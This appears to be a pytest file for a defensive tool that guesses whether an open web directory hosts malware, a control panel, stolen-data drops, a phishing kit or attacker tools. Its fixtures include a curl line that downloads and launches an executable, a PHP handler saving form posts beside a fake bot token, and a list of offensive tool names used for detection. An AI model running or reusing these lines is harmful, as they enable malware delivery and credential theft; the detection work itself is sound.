"""What kind of box a directory is, guessed from the run alone.

Expected scores are written as numbers, so a change of weight is noticed here
rather than recomputed from the table.
"""

from __future__ import annotations

import json
from pathlib import Path

from typer.testing import CliRunner

from dirsift import cli
from dirsift import report_text as T
from dirsift.analyze import analyze
from dirsift.asn import AsnTable
from dirsift.models import Entry, ScanResult
from dirsift.report import render_markdown
from dirsift.report_model import build_report

runner = CliRunner()

ROOT = "http://203.0.113.24/files/"


def file(path: str, kind: str = "data", text: str | None = None, **kw) -> Entry:
    folder, _, name = path.rpartition("/")
    return Entry(
        url=ROOT + path,
        name=name,
        depth=path.count("/") + 1,
        parent_url=ROOT + (folder + "/" if folder else ""),
        kind=kind,
        fetched_bytes=len((text or "x").encode("utf-8")),
        text_preview=text,
        **kw,
    )


def folder(path: str) -> Entry:
    parent, _, name = path.rstrip("/").rpartition("/")
    return Entry(
        url=ROOT + path.rstrip("/") + "/",
        name=name,
        is_dir=True,
        depth=path.count("/"),
        parent_url=ROOT + (parent + "/" if parent else ""),
    )


def run(*entries: Entry, **kw) -> ScanResult:
    scan = ScanResult(root_url=ROOT, entries=list(entries), listing_flavor="apache", **kw)
    result, _ = analyze(scan, asn_table=AsnTable())
    return result


# -- old runs ----------------------------------------------------------------------


def test_a_run_saved_before_roles_loads_and_gets_one(tmp_path: Path):
    old = {
        "root_url": ROOT,
        "listing_flavor": "apache",
        "entries": [
            {"url": ROOT + "photo.jpg", "name": "photo.jpg", "depth": 1, "kind": "image"},
        ],
    }
    path = tmp_path / "old.json"
    path.write_text(json.dumps(old), encoding="utf-8")
    loaded = ScanResult.model_validate(json.loads(path.read_text(encoding="utf-8")))
    assert loaded.role is None
    rescored, _ = analyze(loaded, asn_table=AsnTable())
    assert rescored.role is not None
    assert rescored.role.lead == "unclear"


# -- distribution and panel ------------------------------------------------------------

LOADER = "curl -o svc4.exe http://198.51.100.77/svc4.exe\nstart svc4.exe\n"


def distribution() -> list[Entry]:
    return [
        file("install.bat", "script", LOADER),
        file("svc4.exe", "pe"),
        file("svc5.exe", "pe"),
        file("svc6.exe", "pe"),
    ]


def candidate(result: ScanResult, role: str):
    return next(c for c in result.role.candidates if c.role == role)


def test_a_loader_and_its_builds_read_as_distribution():
    result = run(*distribution())
    assert result.role.lead == "distribution"
    found = candidate(result, "distribution")
    assert found.score == 70
    assert found.reasons == [
        "executables on the shelf",
        "a run of builds: svc{n}.exe",
        "a script that fetches or launches files that sit here",
        "the top entry point candidate is a script",
    ]
    assert found.evidence == ["svc4.exe", "svc5.exe", "svc6.exe", "install.bat"]
    assert [c.role for c in result.role.candidates] == ["distribution"]
    assert not result.role.victim_data_warning


def panel() -> list[Entry]:
    return [
        file("login.php", "web"),
        file("gate.php", "web"),
        file("config.php", "web"),
        file("home.php", "web"),
        file("stats.php", "web"),
        folder("includes/"),
    ]


def test_a_login_a_gate_a_config_and_includes_read_as_a_panel():
    result = run(*panel())
    assert result.role.lead == "panel"
    found = candidate(result, "panel")
    assert found.score == 65
    assert found.reasons == [
        "named like a panel",
        "web application files, not just a listing",
        "panel configuration or a database dump",
        "a panel's folder layout",
    ]
    assert found.evidence[:3] == ["login.php", "gate.php", "config.php"]
    assert "includes/" in found.evidence


def test_a_script_named_install_is_not_a_panel():
    result = run(*distribution())
    assert "panel" not in [c.role for c in result.role.candidates]


def test_names_match_in_any_case():
    result = run(file("Login.PHP", "web"), file("GATE.php", "web"), file("x.php", "web"))
    assert "named like a panel" in candidate(result, "panel").reasons


# -- drop ------------------------------------------------------------------------------

VICTIMS = [
    "[US]192.0.2.10_2026-10-01",
    "[DE]198.51.100.4_2026-10-02",
    "[TR]203.0.113.9_2026-10-03",
    "[RU]192.0.2.77_2026-10-04",
    "[NL]198.51.100.8_2026-10-05",
]


def drop() -> list[Entry]:
    logs = [file(f"log{n:02d}.txt") for n in range(1, 12)]
    return [
        *[folder(name + "/") for name in VICTIMS],
        folder("Cookies/"),
        file("Passwords.txt"),
        *logs,
    ]


def test_victim_folders_and_stealer_logs_read_as_a_drop_and_warn():
    result = run(*drop())
    assert result.role.lead == "drop"
    found = candidate(result, "drop")
    assert found.score == 65
    assert found.reasons == [
        "many folders named like victims",
        "stealer log layout",
        "mostly data files",
    ]
    assert found.evidence[:5] == [name + "/" for name in VICTIMS]
    assert len(found.evidence) == 8
    assert result.role.victim_data_warning


def test_victim_folders_named_in_other_alphabets_still_count():
    names = [
        "2026-10-01_Ayşegül", "2026-10-02_Сергей", "Çağrı_2026-10-03",
        "Наталья_2026-10-04", "2026-10-05_Öykü",
    ]
    result = run(*[folder(name + "/") for name in names], file("Passwords.txt"))
    found = candidate(result, "drop")
    assert "many folders named like victims" in found.reasons
    assert found.evidence[:5] == [name + "/" for name in names]


def test_four_victim_folders_are_not_yet_a_pattern():
    result = run(*[folder(name + "/") for name in VICTIMS[:4]])
    assert not any(c.role == "drop" for c in result.role.candidates)


def test_a_hardware_id_and_an_archive_count_as_victims():
    names = [f"{n}A3F9C2D41B7E8F60{n}.zip" for n in range(1, 6)]
    result = run(*[file(name, "archive") for name in names])
    assert "many folders named like victims" in candidate(result, "drop").reasons


def test_stealer_names_are_capped_and_an_exfil_client_counts():
    names = ["passwords.txt", "information.txt", "cc.txt", "screen.jpg", "autofill.txt"]
    result = run(*[file(name) for name in names], file("rclone.conf", "config"))
    found = candidate(result, "drop")
    assert found.score == 40  # stealer names capped at 30, plus 10 for rclone
    assert "an exfiltration client" in found.reasons


# -- phishing and toolkit --------------------------------------------------------------

TOKEN = "1234567890:AAH" + "x" * 32


def phishing() -> list[Entry]:
    return [
        file("index.html", "web"),
        folder("css/"),
        folder("js/"),
        file(
            "next.php",
            "web",
            f"<?php $bot = '{TOKEN}'; file_put_contents('results.txt', $_POST);\n",
        ),
        file("results.txt"),
    ]


def test_a_cloned_page_with_its_handler_results_and_a_bot_token_reads_as_phishing():
    result = run(*phishing())
    assert result.role.lead == "phishing"
    found = candidate(result, "phishing")
    assert found.score == 75
    assert found.reasons == [
        "a Telegram bot token; kits commonly report through one",
        "a kit writing its results next to itself",
        "named like a kit's form handler",
        "a cloned site's layout",
    ]
    assert found.evidence == ["next.php", "results.txt", "index.html", "css/", "js/"]


TOOLS = ["mimikatz.exe", "chisel.exe", "nc64.exe", "frpc.exe"]


def test_named_operator_tools_read_as_a_toolkit():
    result = run(*[file(name, "pe") for name in TOOLS], file("sync.exe", "pe"))
    assert result.role.lead == "toolkit"
    found = candidate(result, "toolkit")
    assert found.score == 60
    assert found.reasons == [
        "named like mimikatz, chisel, nc64, frpc; names are cheap, check the bytes "
        "before believing it"
    ]
    assert found.evidence == TOOLS
    assert candidate(result, "distribution").score == 20


def test_a_short_tool_name_only_counts_as_the_whole_stem():
    result = run(file("sync.exe", "pe"), file("ncat_helper.dll", "pe"), file("nc.exe", "pe"))
    found = candidate(result, "toolkit")
    assert found.evidence == ["nc.exe"]
    assert found.score == 15


def test_tool_names_match_in_any_case():
    result = run(file("MIMIKATZ.EXE", "pe"), file("Chisel_Linux_Amd64", "elf"))
    assert candidate(result, "toolkit").evidence == ["MIMIKATZ.EXE", "Chisel_Linux_Amd64"]


# -- the lead --------------------------------------------------------------------------


def test_two_strong_roles_close_together_are_mixed():
    result = run(*distribution(), *[file(name, "pe") for name in TOOLS])
    assert result.role.lead == "mixed"
    assert [(c.role, c.score) for c in result.role.candidates[:2]] == [
        ("distribution", 70),
        ("toolkit", 60),
    ]


def test_a_directory_of_pictures_and_documents_is_unclear():
    result = run(file("holiday.jpg", "image"), file("cv.pdf", "document"), file("a.png", "image"))
    assert result.role.lead == "unclear"
    assert result.role.candidates == []
    assert not result.role.victim_data_warning


def test_scores_stay_on_the_scale_and_evidence_is_capped():
    everything = run(
        *distribution(), *panel(), *drop(), *phishing(),
        *[file(name, "pe") for name in TOOLS],
        *[file(f"mimikatz{n}.exe", "pe") for n in range(20)],
    )
    for found in everything.role.candidates:
        assert 0 <= found.score <= 100
        assert len(found.evidence) <= 8


def test_a_confident_callback_in_code_adds_to_distribution():
    shared = "beacon 198.51.100.77\n"
    result = run(
        *distribution(), file("notes.txt", text=shared), file("backup.ini", "config", shared)
    )
    found = candidate(result, "distribution")
    assert "a callback address in a script or config" in found.reasons
    assert found.score == 80


def test_a_callback_below_75_does_not():
    result = run(*distribution())
    address = next(i for i in result.iocs if i.value == "198.51.100.77")
    assert address.confidence < 75
    reasons = candidate(result, "distribution").reasons
    assert "a callback address in a script or config" not in reasons


def test_a_python_server_on_an_odd_port_adds_a_little():
    scan = ScanResult(
        root_url="http://203.0.113.24:8000/", listing_flavor="python",
        entries=[Entry(url="http://203.0.113.24:8000/a.exe", name="a.exe", depth=1, kind="pe")],
    )
    result, _ = analyze(scan, asn_table=AsnTable())
    found = candidate(result, "distribution")
    assert "a throwaway python server on an odd port" in found.reasons
    assert found.score == 25


def test_the_same_run_gives_the_same_role_twice():
    first = run(*distribution(), *[file(name, "pe") for name in TOOLS]).role
    second = run(*distribution(), *[file(name, "pe") for name in TOOLS]).role
    assert first == second


# -- the report and the terminal -------------------------------------------------------



def report_of(*entries: Entry):
    result, candidates = analyze(
        ScanResult(root_url=ROOT, entries=list(entries), listing_flavor="apache"),
        asn_table=AsnTable(),
    )
    return build_report(result, candidates)


def page(*entries: Entry) -> str:
    return render_markdown(report_of(*entries))


def section(markdown: str) -> str:
    """The Host role part of Key facts, up to the next section."""
    return markdown.split("### " + T.ROLE_HEADING, 1)[1].split("\n## ", 1)[0]


def test_key_facts_name_the_candidate_role():
    markdown = page(*distribution())
    facts = markdown.split("## 2. Key facts", 1)[1].split("\n## ", 1)[0]
    assert "| Candidate role | distribution 70, a candidate, not a conclusion" in facts
    assert "### 2.1 Host role, a candidate, not a verdict" in facts


def test_the_report_lists_every_candidate_with_reasons_and_files():
    body = section(page(*distribution()))
    assert "No request was made for it." in body
    assert (
        "| distribution | 70 | executables on the shelf; a run of builds: svc{n}.exe; "
        "a script that fetches or launches files that sit here; the top entry point "
        "candidate is a script | `svc4.exe`, `svc5.exe`, `svc6.exe`, `install.bat` |"
    ) in body


def test_a_mixed_role_lists_both_and_says_so():
    markdown = page(*distribution(), *[file(name, "pe") for name in TOOLS])
    assert "| Candidate role | mixed: distribution 70, toolkit 60, a candidate" in markdown
    body = section(markdown)
    assert body.index("| distribution | 70 |") < body.index("| toolkit | 60 |")


def test_an_unclear_role_is_one_sentence():
    body = section(page(file("holiday.jpg", "image"), file("cv.pdf", "document")))
    assert [line for line in body.splitlines() if line.strip()] == [T.ROLE_UNCLEAR]


def test_a_drop_opens_the_report_with_the_victim_data_warning():
    markdown = page(*drop())
    summary = markdown.split("## 1. Executive summary", 1)[1].split("\n## ", 1)[0]
    first = next(line for line in summary.splitlines() if line.strip())
    assert first == f"_{T.VICTIM_DATA_WARNING}_"
    assert "stolen data" not in page(*distribution())


def test_the_pdf_carries_the_role_and_the_warning():
    import io

    from pypdf import PdfReader

    from dirsift.report_pdf import render_pdf

    reader = PdfReader(io.BytesIO(render_pdf(report_of(*drop()))))
    text = " ".join(" ".join((page.extract_text() or "").split()) for page in reader.pages)
    assert "Host role" in text
    assert "may hold other people's stolen data" in text
    assert "many folders named like victims" in text


def saved(tmp_path: Path, entries: list[Entry]) -> Path:
    path = tmp_path / "run.json"
    scan = ScanResult(root_url=ROOT, entries=entries, listing_flavor="apache")
    path.write_text(scan.model_dump_json(indent=2), encoding="utf-8")
    return path


def test_the_terminal_summary_shows_the_role(monkeypatch):
    monkeypatch.setattr(cli, "scan", lambda url, options: ScanResult(
        root_url=ROOT, listing_flavor="apache", entries=distribution()))
    reply = runner.invoke(cli.app, ["scan", ROOT, "--quiet"])
    assert reply.exit_code == 0, reply.stdout
    assert any(
        line.split()[:3] == ["role", "distribution", "70"] for line in reply.stdout.splitlines()
    ), reply.stdout
    assert "stolen data" not in reply.stdout


def test_the_terminal_summary_warns_about_a_drop(monkeypatch):
    monkeypatch.setattr(cli, "scan", lambda url, options: ScanResult(
        root_url=ROOT, listing_flavor="apache", entries=drop()))
    reply = runner.invoke(cli.app, ["scan", ROOT, "--quiet"])
    assert reply.exit_code == 0
    assert "role" in reply.stdout and "drop 65" in reply.stdout
    assert "other people's stolen data" in " ".join(reply.stdout.split())


def test_analyse_and_report_never_open_a_connection(tmp_path: Path, monkeypatch):
    import httpx

    class NoNetwork:
        def __init__(self, *args, **kwargs):
            raise AssertionError("tried to open an HTTP client")

    monkeypatch.setattr(httpx, "Client", NoNetwork)
    monkeypatch.setattr(httpx, "AsyncClient", NoNetwork)
    assert run(*drop()).role.lead == "drop"
    reply = runner.invoke(cli.app, ["report", str(saved(tmp_path, drop()))])
    assert reply.exit_code == 0, reply.stdout
    assert "### 2.1 Host role" in reply.stdout


def test_non_ascii_victim_names_reach_the_report_intact(tmp_path: Path):
    names = ["2026-10-01_Ayşegül", "2026-10-02_Сергей", "Çağrı_2026-10-03",
             "Наталья_2026-10-04", "2026-10-05_Öykü"]
    out = tmp_path / "triage.md"
    entries = [*[folder(n + "/") for n in names], *[file(f"l{i}.txt") for i in range(10)]]
    path = saved(tmp_path, entries)
    reply = runner.invoke(cli.app, ["report", str(path), "-o", str(out)])
    assert reply.exit_code == 0
    text = out.read_text(encoding="utf-8")
    for name in names[:5]:
        assert f"`{name}/`" in text


# -- STIX -----------------------------------------------------------------------------


def infrastructure_of(*entries: Entry) -> dict:
    from dirsift.stix import build_bundle

    result, candidates = analyze(
        ScanResult(root_url=ROOT, entries=list(entries), listing_flavor="apache"),
        asn_table=AsnTable(),
    )
    bundle = build_bundle(result, candidates)
    return next(o for o in bundle["objects"] if o["type"] == "infrastructure")


def test_each_role_maps_to_its_stix_infrastructure_type():
    cases = [
        (distribution(), ["hosting-malware"]),
        (panel(), ["command-and-control"]),
        (drop(), ["exfiltration"]),
        (phishing(), ["phishing"]),
        ([file(name, "pe") for name in TOOLS], ["staging"]),
        ([*distribution(), *[file(name, "pe") for name in TOOLS]], ["hosting-malware", "staging"]),
        ([file("holiday.jpg", "image")], ["unknown"]),
    ]
    for entries, expected in cases:
        assert infrastructure_of(*entries)["infrastructure_types"] == expected, expected


def test_the_description_names_the_candidate_role_and_its_reasons():
    description = infrastructure_of(*distribution())["description"]
    assert "Candidate role: distribution (executables on the shelf; a run of builds" in description
    assert "no judgement" in description


def test_every_role_bundle_passes_the_strict_validator():
    from stix2validator import ValidationOptions, validate_string

    from dirsift.stix import build_bundle, bundle_json

    for entries in (distribution(), panel(), drop(), phishing(), [file(n, "pe") for n in TOOLS]):
        result, candidates = analyze(
            ScanResult(root_url=ROOT, entries=list(entries), listing_flavor="apache"),
            asn_table=AsnTable(),
        )
        text = bundle_json(build_bundle(result, candidates))
        results = validate_string(text, ValidationOptions(version="2.1", strict=True))
        assert results.is_valid, [str(e) for e in (results.errors or [])]
